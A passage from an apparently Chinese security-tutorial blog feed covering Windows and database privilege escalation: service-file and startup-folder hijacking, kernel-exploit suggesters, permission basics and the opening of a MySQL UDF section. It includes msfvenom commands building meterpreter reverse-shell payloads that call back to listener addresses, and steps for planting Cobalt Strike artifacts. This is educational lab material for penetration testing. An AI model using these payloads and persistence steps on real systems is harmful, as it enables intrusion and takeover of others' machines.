class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><p>可能查不出来（低权限）</p><p>3.使用accesschk工具查询权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">accesschk apache C:\ /accepteula<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109110633463.png" alt=" "> </p><p>对1.exe也有写权限</p><p><img src="/img/image-20240109110709242.png" alt="image-20240109110709242"> </p><p>4.替换程序为自己的程序</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> <span class="hljs-keyword">copy</span> artifact.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;C:\test111\1.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109111053613.png" alt="image-20240109111053613"> </p><p><img src="/img/image-20240109111102295.png" alt="image-20240109111102295"></p><h2 id="8-启动项提权"><a href="#8-启动项提权" class="headerlink" title="8.启动项提权"></a>8.启动项提权</h2><h3 id="提权原理-6"><a href="#提权原理-6" class="headerlink" title="提权原理"></a>提权原理</h3><p>windows启动项目录下的脚本可以开机自启，利用这一个特性向上述的目录传入恶意的脚本达到提权的 目的，<strong>前提是有目录或者注册表的更改权限</strong></p><p><img src="/img/image-20240109112541591.png" alt="image-20240109112541591"> </p><h3 id="提权环境-3"><a href="#提权环境-3" class="headerlink" title="提权环境"></a>提权环境</h3><p>启动项文件夹如下</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">启动文件夹<br><span class="hljs-name">C</span>:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup<br><span class="hljs-name">C</span>:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109111518303.png" alt="image-20240109111518303"> </p><p>启动注册表</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Current\Version\Policies\Explorer\Run<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\Current\Version\RunServicesOnce<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Current\Version\Run\ServicesOnce<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Services<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Current\Version\RunServices<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\Current\Version\Run\Oncel\Setup<br>HKEY_LOCAL_MACHINE\SOFTWAREMicrosoft\Windows\Current\Version\Run\Once\Setup<br>HKEY_LOCAL_MACHINE\SOFT\WAREMicrosoft\Windows\CurrentVersion\RunOnce<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\Current\Version\RunOnce<br>HKEY_CURRENT_USER\SoftwarelMicrosoft\Windows\Current\Version\Run<br>HKEY_LOCAL_MACHINE\SOFT\WARE\Microsoft\Windows\Current\Version\Run<br></code></pre></td></tr></table></figure><h3 id="提权复现-1"><a href="#提权复现-1" class="headerlink" title="提权复现"></a>提权复现</h3><p>1.获取一个MSF或者CS的shel</p><p>2.查询文件夹权限</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> accesschk.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109112654926.png" alt="image-20240109112654926"></p><p>3.将恶意文件进行复制</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> <span class="hljs-keyword">copy</span> artifact.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109112821701.png" alt="image-20240109112821701"></p><p>4.重启即可上线</p><p><img src="/img/image-20240109113123357.png" alt="image-20240109113123357"></p>]]></content>
    
    
    <categories>
      
      <category>提权</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>提权-windows系统内核溢出漏洞提权</title>
    <link href="/2024/01/08/%E6%8F%90%E6%9D%83-windows%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/"/>
    <url>/2024/01/08/%E6%8F%90%E6%9D%83-windows%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="windows系统内核溢出漏洞提权"><a href="#windows系统内核溢出漏洞提权" class="headerlink" title="windows系统内核溢出漏洞提权"></a>windows系统内核溢出漏洞提权</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>溢出提权是指攻击者利用系统本身或系统中软件的漏洞来获取 Windows操作系统System权限,其中溢出提权又分为远程溢出和本地溢出。远程溢出需要与远程服务器建立连接,然后根据系统漏洞使用相应的溢出程序获取远程服务器的 Windows操作系统System权限。本地溢出是主流的提权方式,通常需要向服务器上传本地溢出程序,然后在服务器执行,如果系统存在漏洞,那么将会溢出获得 Windows操作系统 System权限。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>缓冲区提权步骤如下：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(1)</span>信息收集,例如查看当前权限,查看版本、补丁等<br><span class="hljs-comment">(2)</span>根据收集到的信息确定可利用漏洞<br><span class="hljs-comment">(3)</span>根据漏洞查找EXP<br><span class="hljs-comment">(4)</span>使用EXP提权。<br></code></pre></td></tr></table></figure><p>获取目标主机的一个普通用户的shell后，执行如下命令，查看目标系统上安装了那些补丁</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>info<br>wmic qfe get <span class="hljs-keyword">caption</span>,description,hotfixid,installedon<br></code></pre></td></tr></table></figure><img src="/img/image-20231204212220032.png" alt="image-20231204212220032" style="zoom:67%;" /> <p>查看当前的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /groups<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231204212249308.png" alt="image-20231204212249308"></p><h3 id="常见补丁对应漏洞表"><a href="#常见补丁对应漏洞表" class="headerlink" title="常见补丁对应漏洞表"></a>常见补丁对应漏洞表</h3><p><img src="/img/image-20231204212411389.png" alt="image-20231204212411389"></p><p><img src="/img/image-20231204212430128.png" alt="image-20231204212430128"></p><p><img src="/img/image-20231204212440949.png" alt="image-20231204212440949"></p><h2 id="提权方式"><a href="#提权方式" class="headerlink" title="提权方式"></a>提权方式</h2><h3 id="1-利用msf提权"><a href="#1-利用msf提权" class="headerlink" title="1.利用msf提权"></a>1.利用msf提权</h3><p>使用MSF提权必选先上线到MSF然后使用如下的插件进项提权扫描</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">getsystem 提权 一般是将管理员提升到system<br>use post<span class="hljs-regexp">/windows/g</span>ather/enum_patches<br>use post<span class="hljs-regexp">/multi/</span>recon/local_exploit_suggester<br></code></pre></td></tr></table></figure><p>1、上线到MSF</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -a x86 --platform windows -p windows/x86/meterpreter/reverse_tcp<br><span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=3333 -f exe -o test.exe （32位）<br><br>msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=3333 -f exe -o test.exe （64位）<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.210.100.128<br><span class="hljs-built_in">set</span> lport 3333<br>exploit<br></code></pre></td></tr></table></figure><p>2、先使用自动提权getsystem，失败的机率很大</p><p><img src="/img/image-20231204221248981.png" alt="image-20231204221248981"></p><p>3、使用脚本检测可以利用的提权模块,速度可能有点慢，耐心等待</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/recon/local_exploit_suggester<br><span class="hljs-keyword">set</span> session ID<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231204221306842.png" alt="image-20231204221306842"></p><p>4、使用对应的脚本然后进行提权即可</p><p><img src="/img/image-20231204221322746.png" alt="image-20231204221322746"></p><h3 id="2-windows-exploit-suggester提权"><a href="#2-windows-exploit-suggester提权" class="headerlink" title="2.windows exploit suggester提权"></a>2.windows exploit suggester提权</h3><p>Windows-Exploit-Suggester是一款提权辅助工具，下载地址如下</p><p><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p><p>它是用python开发而成，运行环境是python本，且必须安装xlrd 库其主要功能是通过比对systeminfo 生成的文件，从而发现系统是否存在未修复漏洞。</p><p>步骤如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>、下载软件<br><span class="hljs-number">2</span>、通过systeminfo &gt; systeminfo<span class="hljs-selector-class">.txt</span> 生成txt文件<br><span class="hljs-number">3</span>、python2 -m pip install xlrd==<span class="hljs-number">1.2</span>.<span class="hljs-number">0</span> 安装库<br><span class="hljs-number">4</span>、python2 windows-exploit-suggester<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--update</span> 更新库会生成xls文件<br><span class="hljs-number">5</span>、python2 windows-exploit-suggester<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--database</span> xls文件名 <span class="hljs-attr">--systeminfo</span><br>systeminfo<span class="hljs-selector-class">.txt</span><br><span class="hljs-number">6</span>、对比信息查找漏洞<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231204215413579.png" alt="image-20231204215413579"></p><h3 id="3-在线辅助提权"><a href="#3-在线辅助提权" class="headerlink" title="3.在线辅助提权"></a>3.在线辅助提权</h3><p><a href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a></p><img src="/img/image-20231204214859024.png" alt="image-20231204214859024" style="zoom:67%;" /><img src="/img/image-20231204214912745.png" alt="image-20231204214912745" style="zoom:67%;" /><h3 id="4-wesng-提权"><a href="#4-wesng-提权" class="headerlink" title="4.wesng 提权"></a>4.wesng 提权</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python wes<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--update</span><br>python wes<span class="hljs-selector-class">.py</span> systeminfo<span class="hljs-selector-class">.txt</span><br>python wes<span class="hljs-selector-class">.py</span> systeminfo<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--impact</span> <span class="hljs-string">&quot;Remote Code Execution&quot;</span><br>python wes<span class="hljs-selector-class">.py</span> systeminfo<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--impact</span> <span class="hljs-string">&quot;Remote Code Execution&quot;</span> -e<br></code></pre></td></tr></table></figure><h3 id="EXP如何搜索"><a href="#EXP如何搜索" class="headerlink" title="EXP如何搜索"></a>EXP如何搜索</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/offensive-security/</span>exploitdb<br>https:<span class="hljs-regexp">//</span>www.exploit-db.com<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecWiki/</span>windows-kernel-exploits<br></code></pre></td></tr></table></figure><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>现在控制了一台机器然后需要进行提权 </p><p>1、查看当前用户权限，是apache权限需要提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span> /groups<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205102452016.png" alt="image-20231205102452016"></p><p>2、查看安装补丁情况，发现安装了两个补丁，我们查找EXP进行提权</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205102423526.png"> </p><p>3、输入补丁情况进行查询</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>.hacking8.com/tiquan<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205102518724.png" alt="image-20231205102518724"></p><p>使用提权脚本提权</p><p><img src="/img/image-20231205102726601.png" alt="image-20231205102726601"></p><p>4、上线到MSF</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp<br><span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=3333 -f exe -o test.exe<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.210.100.128<br><span class="hljs-built_in">set</span> lport 3333<br>exploit<br><br>background<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205104154110.png" alt="image-20231205104154110"> </p><p>5、搜索提权的漏洞</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/recon/local_exploit_suggester<br><span class="hljs-keyword">set</span> session ID<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205105537383.png" alt="image-20231205105537383"> </p><p>使用该模块尝试即可</p><p><img src="/img/image-20231205105844394.png" alt="image-20231205105844394"> </p><p>6、利用cs提权脚本</p><p><img src="/img/image-20231205105929764.png" alt="image-20231205105929764"> </p>]]></content>
    
    
    <categories>
      
      <category>提权</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>提权-操作系统权限基础</title>
    <link href="/2024/01/08/%E6%8F%90%E6%9D%83-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/01/08/%E6%8F%90%E6%9D%83-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统权限介绍"><a href="#操作系统权限介绍" class="headerlink" title="操作系统权限介绍"></a>操作系统权限介绍</h1><p>权限提升简称提权,顾名思义就是提升自己在目标系统中的权限。现在的操作系统都是多用户操作系统, 用户之间都有权限控制,比如通过Web漏洞拿到的是web进程的权限,往往Web服务都是以一个权限很低 的账号启动的,因此通过 Webshell进行一些操作会受到限制,这就需要将其提升为管理,提权一般分为这么 几种情况</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1、windows系统下的提权<br>2、linux系统下的提权<br>3、数据库系统下的提权<br>4、利用第三方软件提权<br></code></pre></td></tr></table></figure><h2 id="Windows权限介绍"><a href="#Windows权限介绍" class="headerlink" title="Windows权限介绍"></a>Windows权限介绍</h2><p>windows提权一般是提权到administrator或者system权限</p><h3 id="Windows用户帐户"><a href="#Windows用户帐户" class="headerlink" title="Windows用户帐户"></a>Windows用户帐户</h3><p>windows中的用户账号一般分为以下几个</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">1、本地普通用户<br>2、本地一般管理员<br>3、本地最高管理员<br>4、域内普通用户<br>5、域内管理员<br></code></pre></td></tr></table></figure><p><strong>本地普通用户</strong> </p><p>本地普通用户，就是在windows电脑中本地新建的普通用户。没有管理员的权限，一般很多操作执行不 了，需要管理员认证后才可以执行，以下是windows用户组，新建的用户一般默认是users组</p><p><img src="/img/image-20231202170258668.png" alt="image-20231202170258668"></p><p>使用以下命令创建一个用户（必须是管理员打开的CMD）</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">hack</span> Admin@<span class="hljs-number">123</span> /add<br></code></pre></td></tr></table></figure> <img src="/img/image-20231202170329584.png" alt="image-20231202170329584" style="zoom:67%;" /> <p>登录普通用户</p><p><img src="/img/image-20231202170352369.png" alt="image-20231202170352369"> </p><p>当我们进行高权限的操作时候会出现以下的认证（需要输入管理员的账号和密码才可以）此时就需要提权</p><img src="/img/image-20231202170415197.png" alt="image-20231202170415197" style="zoom:67%;" /> <p><strong>本地一般管理员</strong></p><p>本地一般管理员就是加入了administratorts组的管理员但不是administrator用户</p><img src="/img/image-20231202170438915.png" alt="image-20231202170438915" style="zoom:67%;" /> <p>admin用户虽然也是管理员，但是有些操作也是执行不了的，因为有UAC，</p><img src="/img/image-20231202170514220.png" alt="image-20231202170514220" style="zoom:67%;" /> <p>如果要执行高权限的操作必须右键使用管理员打开</p><img src="/img/image-20231202170527056.png" alt="image-20231202170527056" style="zoom:80%;" /><p><strong>本地最高管理员</strong> </p><p>本地用户最高管理员是administrator在windows电脑中administrator用户在一些版本电脑中是禁用 的，如下</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta">windows <span class="hljs-keyword">server</span> 默认开启administrator<br>windows 家庭版，旗舰版 默认不开启administrator<br>windows 企业版，专业版 默认开启administrator<br></code></pre></td></tr></table></figure><img src="/img/image-20231202170630715.png" alt="image-20231202170630715" style="zoom:67%;" /> <p>开启和关闭administrator</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">administrator</span> /active:yes 开启<br>net <span class="hljs-keyword">user</span> <span class="hljs-title">administrator</span> /active:no 禁用<br></code></pre></td></tr></table></figure><p><strong>域内普通用户</strong></p><img src="/img/image-20231202170702416.png" alt="image-20231202170702416" style="zoom:80%;" /> <p><strong>域内管理员</strong></p><img src="/img/image-20231202170726997.png" alt="image-20231202170726997" style="zoom:80%;" /> <h3 id="Windows服务账号"><a href="#Windows服务账号" class="headerlink" title="Windows服务账号"></a>Windows服务账号</h3><p>服务帐户用于在Windows中运行服务。服务帐户不能用于登录Windows系统。system是服务账号的最高权限，administrator是管理员用户，一般你平时运行的程序都是以这个权限身份运行的，平时安装软件什么什么的、修改系统设置都是以这个权限操作的，system权限是系统自己的权限，任务管理器里面只要是以system这个用户名运行的程序都是系统本身的程序，比如任务管理器里面的 winlogon.exe、svchost.exe、alg.exe这些进程等等，而不是你运行的程序</p><p><img src="/img/image-20231202170843049.png" alt="image-20231202170843049"> </p><h2 id="Linux权限介绍"><a href="#Linux权限介绍" class="headerlink" title="Linux权限介绍"></a>Linux权限介绍</h2><p>linux提权就是将普通的用户提权到root用户</p><h3 id="passwd文件"><a href="#passwd文件" class="headerlink" title="passwd文件"></a>passwd文件</h3><p>Linux 系统中的 &#x2F;etc&#x2F;passwd 文件，是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作。</p><p><img src="/img/image-20231202172149655.png" alt="image-20231202172149655"></p><h3 id="shadow文件"><a href="#shadow文件" class="headerlink" title="shadow文件"></a>shadow文件</h3><p>密码保存在 &#x2F;etc&#x2F;shadow的文件中，这个文件只有root用户能够读取，其他用户都无法读取该文件</p><p><img src="/img/image-20231202172211578.png" alt="image-20231202172211578"></p><h1 id="常见提权环境"><a href="#常见提权环境" class="headerlink" title="常见提权环境"></a>常见提权环境</h1><p>因为拿到目标系统的shell不同，提权的方式也不同，每种提权的姿势也就不同。</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>webshell就是通过蚁剑，菜刀，冰蝎等工具连接的Shell</p><img src="/img/image-20231203212032564.png" alt="image-20231203212032564" style="zoom:67%;" /> <h2 id="cs的shell"><a href="#cs的shell" class="headerlink" title="cs的shell"></a>cs的shell</h2><p>一般拿到webshell之后我们要上线的CS或者MSF，CS的shell可以提权</p><p><img src="/img/image-20231203212102483.png" alt="image-20231203212102483"></p><h2 id="MSF的shell"><a href="#MSF的shell" class="headerlink" title="MSF的shell"></a>MSF的shell</h2><p>通过MSF连接得到的shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.41.134 <span class="hljs-attribute">LPORT</span>=3333 -f exe -o test.exe<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.41.134<br><span class="hljs-built_in">set</span> lport 3333<br>exploit<br></code></pre></td></tr></table></figure><img src="/img/image-20231203212145333.png" alt="image-20231203212145333" style="zoom:67%;" /> <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>通过反弹shell的方式得到的shell</p><img src="/img/image-20231203212207223.png" alt="image-20231203212207223" style="zoom:80%;" /> <h2 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h2><p><img src="/img/image-20231203212231734.png" alt="image-20231203212231734"></p>]]></content>
    
    
    <categories>
      
      <category>提权</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>提权-数据库提权</title>
    <link href="/2024/01/08/%E6%8F%90%E6%9D%83-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
    <url>/2024/01/08/%E6%8F%90%E6%9D%83-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h1><h2 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h2><p>MySQL是最流行的开放源码SQL数据库管理系统，相对于Oracle，DB2等大型数据库系统，MySQL由于其开源性、易用性、稳定性等特点，受到个人使用者、中小型企业甚至一些大型企业的广泛欢迎，MySQL具有以下特点：</p><p>1、MySQL是一种关联数据库管理系统，具有灵活性。</p><p>2、MySQL软件是一种开放源码软件。</p><p>3、MySQL数据库服务器具有快速、可靠和易于使用的特点。</p><p>4、MySQL服务器工作在客户端&#x2F;服务器模式下，或嵌入式系统中。</p><p>5、MySQL有大量可用的共享MySQL软件。</p><h3 id="MySQL安装"><a href="#MySQL安装" class="headerlink" title="MySQL安装"></a>MySQL安装</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/tony-hyn/</span>p/<span class="hljs-number">15777762</span>.html 安装教程 <br>sudo yum install mysql-devel -y 安装mysql.h文件 <br>systemctl start mysqld 启动 <br>mysqld --user=root root启动 <br>setenforce <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="MySQL内置函数"><a href="#MySQL内置函数" class="headerlink" title="MySQL内置函数"></a>MySQL内置函数</h3><p>MySQL有很多内置函数提供给使用者，包括字符串函数、数值函数、日期和时间函数等，给开发人员和使用者带来了很多方便</p><h3 id="UDF介绍与提权原理"><a href="#UDF介绍与提权原理" class="headerlink" title="UDF介绍与提权原理"></a>UDF介绍与提权原理</h3><p>MySQL的内置函数虽然丰富，但毕竟不能满足所有人的需要，有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，幸运的是，MySQL给使用者提供了添加新函数的机制，这种**使用者自行添加的MySQL函数就称为UDF(User Define Function)**。UDF机制能够起作用，必须使用C或者C++编写函数，你的系统必须支持动态加载,，mysql采用动态链接库加载自定义函数。</p><p>udf就是为了让我们开发者能够自己写方便自己函数，它有3种返回值，这三种分别是STRING，INTEGER，REAL</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">STRING 字符型 <br><span class="hljs-keyword">INTEGER</span> 整型 <br><span class="hljs-keyword">REAL</span> 实数型<br></code></pre></td></tr></table></figure><p>如下面的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mysql.h&gt;</span></span><br> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">testadd</span><span class="hljs-params">(UDF_INIT *initid, UDF_ARGS *args, <span class="hljs-type">char</span> *is_null, <span class="hljs-type">char</span> *error)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> a = *((<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)args-&gt;args[<span class="hljs-number">0</span>]);<br><span class="hljs-type">int</span> b = *((<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)args-&gt;args[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">return</span> a + b;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">my_bool <span class="hljs-title">testadd_init</span><span class="hljs-params">(UDF_INIT *initid, UDF_ARGS *args, <span class="hljs-type">char</span> *message)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>提权原理：本质上使用UDF去执行系统的命令</strong></p><p><strong>提权权限：mysql的服务端是由谁运行，就可以提权到该用户</strong></p><p><img src="/img/image-20240108201419082.png" alt="image-20240108201419082"> </p><h3 id="UDF编写详解"><a href="#UDF编写详解" class="headerlink" title="UDF编写详解"></a>UDF编写详解</h3><h4 id="用户主函数"><a href="#用户主函数" class="headerlink" title="用户主函数"></a>用户主函数</h4><p>我们假设需要定义的函数名字为为xxx, 则我们的函数需要有参数列表和返回值, 这不能由用户随意指定, 是有固定规则的</p><p>返回值是STRING 类型或DECIMAL类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 